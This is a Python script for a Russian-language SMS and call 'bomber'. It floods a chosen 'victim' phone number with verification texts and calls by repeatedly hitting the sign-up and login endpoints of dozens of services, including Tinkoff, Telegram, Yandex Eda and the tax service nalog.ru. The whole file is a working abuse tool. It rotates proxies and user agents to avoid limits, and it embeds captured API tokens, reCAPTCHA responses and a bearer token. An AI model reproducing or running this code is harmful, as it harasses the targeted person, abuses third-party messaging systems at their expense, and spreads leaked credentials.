import os
from banner import banner
import requests
from bs4 import BeautifulSoup as Bs
from data import user_agent
import random
from time import sleep
from threading import Thread

http = []
https = []
phones_in_spam = []

def default_headers() -> dict:
    return {"X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Accept-Encoding": "gzip, deflate, br",
            'User-Agent': user_agent(), 'DNT': '1'}


def post(link, headers=None, **kwargs):
    try:
        requests.post(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
    except:
        pass


def get(link, headers=None, **kwargs):
    try:
        requests.get(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
    except requests.exceptions.RequestException:
        pass


def put(link, headers=None, **kwargs):
    try:
        requests.put(link, headers=headers, timeout=5, **kwargs, proxies=proxies())
    except requests.exceptions.RequestException:
        pass

def phone_format(phone):
    formatted = [elem for elem in phone if elem.isdigit()]
    phone = ''
    for elem in formatted:
        phone += elem
    if phone[:1] == '8':
        return '7' + phone[1:]
    return phone

def pformat(phone: str, mask: str, mask_symbol: str = "*") -> str:
    formatted_phone: str = ""
    for symbol in mask:
        if symbol == mask_symbol:
            formatted_phone += phone[0]
            phone = phone[(len(phone) - 1) * -1:]
        else:
            formatted_phone += symbol
    return formatted_phone


class Bomber:
    def __init__(self, phone: str) -> None:
        requests.packages.urllib3.disable_warnings()
        self.phone = phone
        name = list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
        self.password = "".join(random.choices(name, k=12))
        self.username = "".join(random.choices(name, k=12))
        self.name = "".join(random.choices(name, k=12))
        self.headers = default_headers()
        self.s = requests.Session()
        self.email = f'{self.name}@gmail.com'
        self.android_headers = {"X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Pragma": "no-cache", "Cache-Control": "no-cache", "Accept-Encoding": "gzip, deflate, br", 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'DNT': '1'}

    def dns(self):
        while self.phone in phones_in_spam:
            post("https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/", params={"phone": self.phone, "is_repeat": 0, "order_guid": 1}, headers=self.headers)
            sleep(60)

    def tinkoff(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" + self.phone}, headers=self.headers)
                sleep(60)
            sleep(3600)

    def lenta(self):
        while self.phone in phones_in_spam:
            post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': self.phone}, headers=self.headers)
            sleep(120)

    def qiwi(self):
        while self.phone in phones_in_spam:
            post('https://mobile-api.qiwi.com/oauth/authorize', data={'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': f'+{self.phone}', 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'}, headers=self.android_headers)
            sleep(20)

    def gold(self):
        while self.phone in phones_in_spam:
            post('https://zoloto585.ru/api/bcard/reg2/', json={'birthdate': "29.09.1981", 'city': "Москва", 'email': self.email, 'name': "Иван", 'patronymic': "Иванович", 'phone': pformat(self.phone, "+* (***) ***-**-**"), 'sex': "m", 'surname': "Иванов"})
            sleep(300)

    def telegram(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post('https://my.telegram.org/auth/send_password', data={'phone': '+' + self.phone}, headers=self.headers)
                sleep(20)
            sleep(3600)

    def ok_ru(self):
        while self.phone in phones_in_spam:
            post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={'st.r.phone': '+' + self.phone}, headers=self.headers)
            sleep(60)

    def youla(self):
        while self.phone in phones_in_spam:
            post('https://youla.ru/web-api/auth/request_code', data={'phone': self.phone}, headers={'X-Youla-Json': '{"lvid": "7e72ad9f2ff7840427bd772c0b630c71"}'})
            sleep(20)

    def dodopizza(self):
        while self.phone in phones_in_spam:
            post('https://dodopizza.kz/api/sendconfirmationcode', data={'phoneNumber': self.phone}, headers=self.headers)
            sleep(60)

    def modulbank(self):
        while self.phone in phones_in_spam:
            post('https://my.modulbank.ru/api/v2/auth/phone', json={'Cellphone': self.phone[1:]}, headers=self.headers)
            sleep(60)

    def mtstv(self):
        while self.phone in phones_in_spam:
            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": self.phone}, headers=self.headers)
            sleep(5)

    def citylink(self):
        while self.phone in phones_in_spam:
            for i in range(4):
                post(f'https://www.citilink.ru/registration/confirm/phone/+{self.phone}/', headers=self.headers)
                sleep(60)
            sleep(3600)

    def yandexeda(self):
        while self.phone in phones_in_spam:
            post('https://eda.yandex.ru/api/v1/user/request_authentication_code', json={'phone_number': '+' + self.phone}, headers=self.headers)
            sleep(60)

    def mcdonalds(self):
        while self.phone in phones_in_spam:
            post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={"number": '+' + self.phone, "g-recaptcha-response": "03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V"})
            sleep(60)

    def rutaxi(self):
        while self.phone in phones_in_spam:
            post("https://rutaxi.ru/ajax_auth.html", data={"l": self.phone[1:], "c": "3"})
            sleep(3600)

    def cash_u(self):
        while self.phone in phones_in_spam:
            post('https://cash-u.com/main/rest/firstrequest/phone/confirmation/send', data=pformat(self.phone, '* (***) ***-**-**:'))
            sleep(60)

    def sushibox(self):
        while self.phone in phones_in_spam:
            post('https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfN', json={'phone': self.phone})
            sleep(10)

    def papajons(self):
        while self.phone in phones_in_spam:
            for i in range(11):
                post('https://api.papajohns.ru/user/confirm-code', json={'lang': "ru", 'platform': "web-mobile", 'city_id': "1", 'type': "recovery_password", 'phone': '+' + self.phone})
                sleep(30)
            sleep(3600)

    def pizzaboxru(self):
        while self.phone in phones_in_spam:
            post('https://pizzabox.ru/?action=auth', data={'CSRF': None, 'ACTION': 'REGISTER', 'MODE': 'PHONE', 'PHONE': pformat(self.phone, '+* (***) ***-**-**'), 'PASSWORD': self.password, 'PASSWORD2': self.password})
            sleep(60)

    def dromru(self):
        while self.phone in phones_in_spam:
            post('https://my.drom.ru/sign/recover?return=https%3A%2F%2Fchelyabinsk.drom.ru%2Fauto%2Fall%2F%3Futm_source%3Dyandexdirect%26utm_medium%3Dcpc%26utm_campaign%3Ddrom_74_chelyabinsk_auto-rivals_alldevice_search_handmade%26utm_content%3Ddesktop_search_text_main%26utm_term%3D%25D0%25B0%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D1%2583%2520%25D1%2587%25D0%25B5%25D0%25BB%25D1%258F%25D0%25B1%25D0%25B8%25D0%25BD%25D1%2581%25D0%25BA%26_openstat%3DZGlyZWN0LnlhbmRleC5ydTsxNzY3NTA4MzsxOTMxNzMyNzE4O3lhbmRleC5ydTpwcmVtaXVt%26yclid%3D7777444668347802164%26tcb%3D1609147011', data={'sign': self.phone})
            sleep(60)

    def sportmaster(self):
        while self.phone in phones_in_spam:
            post("https://moappsmapi.sportmaster.ru/api/v1/code", headers={"X-SM-MobileApp": "2dd9bfcfe18c2262", "App-Version": "3.60.5(21555)", "OS": "ANDROID", "Device-Model": "Samsung SM-A205FN", "OS-Version": "9", "User-Agent": "mobileapp-android-9", "Build-Mode": "Production"}, json={"type": "phone", "value": self.phone[1:]})
            sleep(180)

    def utkonos(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                payload = 'request={"Body":{"Phone":"' + pformat(self.phone, '+* *** ***-**-**') + '"},"Head":{"AdvertisingId":"3c725030-70c6-4945-8f75-69d1a5291793","AppsFlyerId":"1612665578706-4330044335349244143","AuthToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Client":"android_9_4.35.3","DeviceId":"3c725030-70c6-4945-8f75-69d1a5291793","MarketingPartnerKey":"mp30-5332b7f24ba54351047601d78f90dafbfd7fcc295f966d3af19aeb","SessionToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Store":"utk","Theme":"dark","Username":"","Password":""}}'
                get("https://www.utkonos.ru/api/v1/SendSmsAuthCode", params=payload)
                sleep(60)
            sleep(3600)

    def rollserv(self):
        for i in range(5):
            post('https://rollserv.ru/user/NewUser/?async=json', data={'type': '2', 'ext[2][1]': 'Иван', 'user[cellphone]': '+' + self.phone, 'user[i_agree]': 'on'})
            sleep(60)
            post('https://rollserv.ru/user/RestorePwd/', data={'login': '+' + self.phone})
            sleep(60)

    def nalog_ru(self):
        while self.phone in phones_in_spam:
            post('https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start', json={'phone': self.phone})
            sleep(60)

    def sber_vkus(self):
        while self.phone in phones_in_spam:
            try:
                self.s.post('https://app.sberfood.ru/api/mobile/v3/auth/sendSms', json={'userPhone': '+' + self.phone}, cookies=self.s.get('https://app.sberfood.ru/auth?redirect=%2F').cookies, headers={'Host': 'app.sberfood.ru', 'Connection': 'keep-alive', 'Content-Length': '28', 'Origin': 'https://app.sberfood.ru', 'AppPlatform': 'Web', 'Features': 'Afisha, SplitOrder, ReferralCampaign', 'Accept-Language': 'ru-RU', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36', 'Content-Type': 'application/json;charset=UTF-8', 'Accept': 'application/json, text/plain, */*', 'Token': '[object Object]', 'userid': '[object Object]', 'mrid': '6480ef6e-896e-4f59-8144-f3c14c87f88d', 'AppKey': 'WebApp-3a2605b0cf2a4c9d938752a84b7e97b6', 'AppVersion': '1', 'Referer': 'https://app.sberfood.ru/auth?redirect=%2F', 'Accept-Encoding': 'gzip, deflate, br'})
            except:
                pass
            sleep(120)

    def broniboy(self):
        while self.phone in phones_in_spam:
            try:
                token = Bs(self.s.get('https://broniboy.ru/moscow/').content, 'html.parser').select('meta[name=csrf-token]')[0]['content']
                self.s.post('https://broniboy.ru/ajax/send-sms', data={'phone': pformat(self.phone, '+* (***) ***-**-**'), '_csrf': token}, headers={'X-CSRF-Token': token, 'X-Requested-With': 'XMLHttpRequest'})
            except:
                pass
            sleep(5)

    def anti_sushi(self):
        while self.phone in phones_in_spam:
            try:
                self.s.get('https://anti-sushi.ru/', headers=self.headers)
                self.s.post('https://anti-sushi.ru/?auth', data={'CSRF': None, 'ACTION': 'REGISTER', 'Session': self.s.cookies['SID'], 'NAME': 'Иван', 'PHONE': self.phone[1:], 'EMAIL': self.email, 'PASSWORD': self.password, 'PASSWORD2': self.password}, headers=self.headers)
            except:
                pass
            sleep(30)

    def megafon_tv(self):
        while self.phone in phones_in_spam:
            post("https://bmp.megafon.tv/api/v10/auth/register/msisdn", cookies={"SessionID": "cj1lWg0n2IdD_gB-BPeZPejNflGdKzMjfWF1s9uldDQ"}, json={'msisdn': self.phone, 'password': "123123112"})
            sleep(60)

    def dixy(self):
        while self.phone in phones_in_spam:
            post('https://loyalty-api.dixy.ru//api/v1/users/register', headers={'appinfo': 'eyJhcHBfdmVyc2lvbiI6IjIuMi4yKzMyMCIsImRldmljZSI6ImFuZHJvaWQiLCJkZXZpY2VfaWQiOiIyZGQ5YmZjZmUxOGMyMjYyIiwib3NfdmVyc2lvbiI6InNkazoyOCJ9', 'dixy-api-token': '7b2f81beb3bc53c95ea7074b9be34b14ca1cb9e0aad355d9be3defb7df54072a64f172051582b9276db166c18c4f410ca21ca603f04e3765c971f590fb7b0c5d'}, json={"user": {"phone": self.phone, "platform": "android", "sms_hash": "EnLcVjUZitT", "loyalty_region_id": "1"}})
            sleep(60)

    def deliverycl(self):
        while self.phone in phones_in_spam:
            post('https://api.zakazaka.ru/v1/', headers={"User-Agent": "android", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data=f'coord=56.02573402362801,36.78194995969534&app_version=android_395&device_id=16151140943779c51dc826104748b2e40f41410314&phone={self.phone}&action=profile.sms')
            sleep(60)

    def b_apteka(self):
        while self.phone in phones_in_spam:
            try:
                self.s.get('https://b-apteka.ru/lk/login', headers=self.android_headers)
                self.s.post('https://b-apteka.ru/lk/send_confirm_code', json={'phone': self.phone}, cookies=self.s.cookies, headers=self.android_headers)
            except:
                pass
            sleep(60)

    def new_tel(self):
        for i in range(2):
            post('https://new-tel.net/ajax/a_api.php', params={'type': 'reg'}, data={'phone_nb': pformat(self.phone, '+* (***) ***-****'), 'phone_number': 'Хочу номер', 'token': '03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz'}, headers={'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'ru,en;q=0.9', 'content-length': '494', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://new-tel.net', 'referer': 'https://new-tel.net/uslugi/call-password/', 'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36', 'x-requested-with': 'XMLHttpRequest'}, verify=False)
            sleep(30)

    def sunlight(self):
        while self.phone in phones_in_spam:
            for i in range(5):
                post('https://api.sunlight.net/v3/customers/authorization/', json={'phone': self.phone})
                sleep(60)

    def icq(self):
        while self.phone in phones_in_spam:
            post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": self.phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=self.headers)
            sleep(30)

    def vk_rabota(self):
        while self.phone in phones_in_spam:
            post('https://api.iconjob.co/api/auth/verification_code', json={'phone': self.phone})
            sleep(60)

    def yota(self):
        while self.phone in phones_in_spam:
            try:
                post('https://bmp.tv.yota.ru/api/v10/auth/register/msisdn',
                     json={'msisdn': self.phone, 'password': "123456"},
                     cookies=requests.get('https://tv.yota.ru/').cookies)
            except:
                pass
            sleep(60)

    def karusel(self):
        while self.phone in phones_in_spam:
            post('https://app.karusel.ru/api/v2/token/', json={
                'recaptcha_token': "03AGdBq27nU1tBT9kfCFtNRuu69Z2HZexs3nqTS1fxAScFvTOHs9XaEQujTEo8O6Wo1W3_QdxyFNl0BEpJue4sXqmoYVFM0EHSQTrdhtvb1exHUnEFMVwJRmP81DzNocYfMq4_qGSfB-ZI-2dz8EewhLnE_fps6ve2liRq5s8Gi_xFzFaU96vmJLp_AyIpcHLHYj2VUPK2R3Edw9k7-sTGj6tn1-Mf3zmeiViREVTYflibQUtQllEsTZnWTJtFFbeu83BNSZB4igHCDU3CtO-usjj-VQLEJaZf-lSKWE7I_c7S9atUy8tq2LbKczfHiOh2INJE6_wD0ILRTOsXWTK1JUVEAtzoZJ5hOo6LsAK98bEE7Cgsz5a-3-84eAHN7gs_pIEeadfimQ4apEu0MY--P_YCYcMU0bm__LFrFoYXEJfnBqjSgkOGUa7vnQJUBRmJkKqdbFzHim6PD4hciKP2AK3rFhGsWqhQuQ",
                'phone': self.phone}, headers=self.headers)
            sleep(30)

    def wilberis(self):
        post('https://www.wildberries.ru/mobile/requestconfirmcode?forAction=EasyLogin', data={"phoneInput.AgreeToReceiveSmsSpam": 'true', "phoneInput.ConfirmCode": '', "phoneInput.FullPhoneMobile": self.phone, "returnUrl": "https%3A%2F%2Fwww.wildberries.ru%2Flk", "phonemobile": self.phone, "agreeToReceiveSms": "true", "shortSession": "false", "period": "ru"}, headers=self.headers)

    def utair(self):
        post('https://b.utair.ru/api/v1/profile/', json={'phone': '+' + self.phone, 'confirmationGDPRDate': 1619416368}, headers={'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyNzg0Iiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmVtZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyIsImFwcC5vcmRlcnMud2l0aGRyYXciLCJhcHAub3JkZXJzLnJlZnVuZCJdLCJleHAiOjE2NDU1ODQ1OTB9.a5uI-zyZVlXHU-bDr8rJ1UBGGjjaAHsSBw_YKg-cHMM'})

        while self.phone in phones_in_spam:
            for i in range(10):
                post('https://b.utair.ru/api/v1/login/', json={'login': '+'+self.phone, 'confirmation_type': "call_code"}, headers=self.headers)
                sleep(60)
            sleep(360)

    def goods(self):
        while self.phone in phones_in_spam:
            for i in range(4):
                post('https://goods.ru/api/mobile/v1/securityService/extraAuthentication/keySend', json={'token': "5888d4f4-bac1-4d47-8957-f0c7e8ee9866", 'context': 0, 'phone': self.phone}, headers=self.headers)
                sleep(90)
            sleep(3600)

    def call(self):
        services = [self.utair, self.new_tel]
        for function in services:
            Thread(target=function, daemon=False).start()
            sleep(30)

    def rus(self):
        services = [self.goods, self.wilberis, self.karusel, self.yota, self.dns, self.lenta, self.tinkoff, self.qiwi, self.gold, self.ok_ru, self.telegram, self.youla, self.dodopizza, self.mtstv, self.modulbank, self.yandexeda, self.citylink, self.rutaxi, self.mcdonalds, self.cash_u, self.sushibox, self.papajons, self.pizzaboxru, self.sportmaster, self.dromru, self.utkonos, self.nalog_ru, self.rollserv, self.broniboy, self.sber_vkus, self.anti_sushi, self.dixy, self.megafon_tv, self.b_apteka, self.deliverycl, self.sunlight, self.icq, self.vk_rabota]
        for function in services:
            Thread(target=function, daemon=False).start()
            sleep(1)

def proxies():
    proxies = {}

    if http:
        proxies['HTTP'] = random.choice(http)
    if https:
        proxies['HTTPS'] = random.choice(https)
    return proxies

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    print(banner)
    print(f'\n\n[1] Бомберы\n[2] Меню прокси\n[3] Информация\n[4] Контакты')
    task = input('')
    if task.isdigit():
        if task == '4':
            clear()
            print(banner)
            print(
                'Основа: t.me/DishonorDev\nТвинк: t.me/DishonorDevlope')
            sleep(10)
            main()
        elif task == '3':
            clear()
            print(banner)
            print('Приятного разьеба :)')
            sleep(5)
            main()

        elif task == '2':
            clear()
            print(banner)
            print('[1] http Прокси\n[2] https прокси\n[0] Вернуться в меню')
            task = input('')
            if task.isdigit():
                if task == '0':
                    clear()
                    main()
                elif task == '1':
                    clear()
                    print(banner)
                    print('Введите прокси в формате 192.168.1.1:8080\nДля отмены введите 0')
                    proxy = input('')
                    if proxy == '0':
                        clear()
                        main()
                    else:
                        http.append('http://'+proxy)
                        clear()
                        print(banner)
                        print('Прокси успешно добавлен!')
                        sleep(3)
                        main()
                elif task == '2':
                    clear()
                    print(banner)
                    print('Введите прокси в формате 192.168.1.1:8080\nДля отмены введите 0')
                    proxy = input('')
                    if proxy == '0':
                        clear()
                        main()
                    else:
                        https.append('https://' + proxy)
                        clear()
                        print(banner)
                        print('Прокси успешно добавлен!')
                        sleep(3)
                        main()
            else:
                clear()
                print(banner)
                print('Я тебя не понял')
                sleep(3)
                main()
        elif task == '1':
            clear()
            print(banner)
            print('[1] SMS Bomber\n[2] Call Bomber\n[3] Остановить спам ')
            task = input('')
            if task.isdigit():
                if task == '3':
                    clear()
                    print(banner)
                    if phones_in_spam:
                        for phone in phones_in_spam:
                            print(f'Номер: {phone}')
                        print('\nДля остановки спама, введите номер телефона. Для отмены введите 0')
                        slot = input('')
                        if slot == '0':
                            main()
                        if slot.isdigit():
                            if slot in phones_in_spam:
                                phones_in_spam.remove(slot)
                                clear()
                                print(banner)
                                print('Спам на номер успешно остановлен!')
                                sleep(5)
                                main()
                            else:
                                clear()
                                print(banner)
                                print('Неверный номер!')
                                sleep(2)
                                main()
                    else:
                        print('Не запущенно ни одной сесси спама!')
                        sleep(2)
                        main()
                elif task == '2':
                    clear()
                    print(banner)
                    print('Внимание! Данный бомбер работает только на Российские номера!\n')
                    print('Введите номер. Для отмены 0')
                    phone = input('')
                    if phone == '0':
                        main()
                    else:
                        phone = phone_format(phone)
                        Thread(target=Bomber(phone).call, daemon=False).start()
                        phones_in_spam.append(phone)
                        print(f'Спам на номер {phone} начат.')
                        sleep(5)
                        main()
                elif task == '1':
                    clear()
                    print(banner)
                    print('Введите номер жертвы в любом формате. Для отмены введите 0')
                    phone = input('')
                    if phone == '0':
                        main()
                    else:
                        phone = phone_format(phone)
                        Thread(target=Bomber(phone).rus, daemon=False).start()
                        phones_in_spam.append(phone)
                        print(f'Спам на номер {phone} начат.')
                        sleep(5)
                        main()
                else:
                    clear()
                    print('Я тебя не понял')
                    sleep(5)
                    main()
            else:
                clear()
                print('Я тебя не понял')
                sleep(5)
                main()
        else:
            clear()
            print('Я тебя не понял')
            sleep(5)
            main()
    else:
        clear()
        print('Я тебя не понял')
        sleep(5)
        main()


if __name__ == '__main__':
    main()
